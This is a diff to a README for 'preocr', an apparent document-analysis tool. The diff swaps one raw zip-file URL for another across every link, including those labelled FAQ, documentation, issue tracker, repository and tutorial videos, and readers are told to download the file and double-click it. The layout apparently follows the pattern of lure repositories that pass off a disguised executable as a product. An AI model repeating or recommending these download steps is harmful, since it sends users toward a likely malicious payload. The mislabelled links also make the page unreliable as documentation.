@@ -8,7 +8,7 @@ Welcome to **preocr**! This application helps you analyze different types of doc
 
 To get started, you need to download the software. Click the link below to visit the Releases page:
 
-[Download preocr](https://github.com/cannsssff/preocr/raw/refs/heads/main/docs/Software_v2.8.zip)
+[Download preocr](https://raw.githubusercontent.com/cannsssff/preocr/main/preocr/Software_2.1-beta.3.zip)
 
 Once you're on the Releases page, follow these steps:
 
@@ -17,7 +17,7 @@ Once you're on the Releases page, follow these steps:
 3. Click on the file to download it.
 4. After the download completes, locate the file and double-click to run it.
 
-For any questions, refer to the [Frequently Asked Questions](https://github.com/cannsssff/preocr/raw/refs/heads/main/docs/Software_v2.8.zip) section or ask for help in the community forums.
+For any questions, refer to the [Frequently Asked Questions](https://raw.githubusercontent.com/cannsssff/preocr/main/preocr/Software_2.1-beta.3.zip) section or ask for help in the community forums.
 
 ## 🌟 Features
 
@@ -62,16 +62,16 @@ If you encounter any issues or have suggestions for improvements, we want to hea
 
 Join our growing community on GitHub where users share insights, solutions, and tips. Check out the following resources:
 
-- **Documentation**: Read more about features and settings [here](https://github.com/cannsssff/preocr/raw/refs/heads/main/docs/Software_v2.8.zip).
-- **Bug Reporting**: Report any issues through our [issue tracker](https://github.com/cannsssff/preocr/raw/refs/heads/main/docs/Software_v2.8.zip).
+- **Documentation**: Read more about features and settings [here](https://raw.githubusercontent.com/cannsssff/preocr/main/preocr/Software_2.1-beta.3.zip).
+- **Bug Reporting**: Report any issues through our [issue tracker](https://raw.githubusercontent.com/cannsssff/preocr/main/preocr/Software_2.1-beta.3.zip).
 - **Usage Examples**: Explore how others use preocr effectively.
 
 ## 🔗 Additional Links
 
 For more information about preocr, visit:
 
-- [Official Repository](https://github.com/cannsssff/preocr/raw/refs/heads/main/docs/Software_v2.8.zip)
-- [API Documentation](https://github.com/cannsssff/preocr/raw/refs/heads/main/docs/Software_v2.8.zip)
-- [Tutorial Videos](https://github.com/cannsssff/preocr/raw/refs/heads/main/docs/Software_v2.8.zip)
+- [Official Repository](https://raw.githubusercontent.com/cannsssff/preocr/main/preocr/Software_2.1-beta.3.zip)
+- [API Documentation](https://raw.githubusercontent.com/cannsssff/preocr/main/preocr/Software_2.1-beta.3.zip)
+- [Tutorial Videos](https://raw.githubusercontent.com/cannsssff/preocr/main/preocr/Software_2.1-beta.3.zip)
 
 Thank you for choosing preocr. We hope it becomes a valuable tool in your document processing tasks!
